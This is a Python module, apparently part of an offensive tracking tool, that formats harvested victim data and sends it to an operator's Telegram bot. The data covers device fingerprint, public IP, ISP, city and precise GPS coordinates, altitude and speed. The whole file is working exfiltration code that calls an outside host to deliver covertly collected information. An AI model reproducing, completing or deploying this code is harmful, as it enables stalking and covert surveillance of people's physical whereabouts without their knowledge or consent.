import utils
import requests
from json import dumps, loads

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow


def send_request(token, msg):
    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'
    api_params = {
        'chat_id': token[2],
        'text': msg,
        'parse_mode': 'MarkdownV2'
    }
    rqst = requests.get(api_url, params=api_params, timeout=10)
    if rqst.status_code != 200:
        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)["description"]}\n')


def tgram_sender(msg_type, content, token):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = f"""
*Device Information*

```
OS         : {json_content['os']}
Platform   : {json_content['platform']}
Browser    : {json_content['browser']}
GPU Vendor : {json_content['vendor']}
GPU        : {json_content['render']}
CPU Cores  : {json_content['cores']}
RAM        : {json_content['ram']}
Public IP  : {json_content['ip']}
Resolution : {json_content['ht']}x{json_content['wd']}
```"""
        send_request(token, info_message)

    if msg_type == 'ip_info':
        ip_message = f"""
*IP Information*

```
Continent : {json_content['continent']}
Country   : {json_content['country']}
Region    : {json_content['region']}
City      : {json_content['city']}
Org       : {json_content['org']}
ISP       : {json_content['isp']}
```
"""
        send_request(token, ip_message)

    if msg_type == 'location':
        loc_message = f"""
*Location Information*

```
Latitude  : {json_content['lat']}
Longitude : {json_content['lon']}
Accuracy  : {json_content['acc']}
Altitude  : {json_content['alt']}
Direction : {json_content['dir']}
Speed     : {json_content['spd']}
```
"""
        send_request(token, loc_message)

    if msg_type == 'url':
        url_msg = json_content['url']
        send_request(token, url_msg)

    if msg_type == 'error':
        error_msg = json_content['error']
        send_request(token, error_msg)
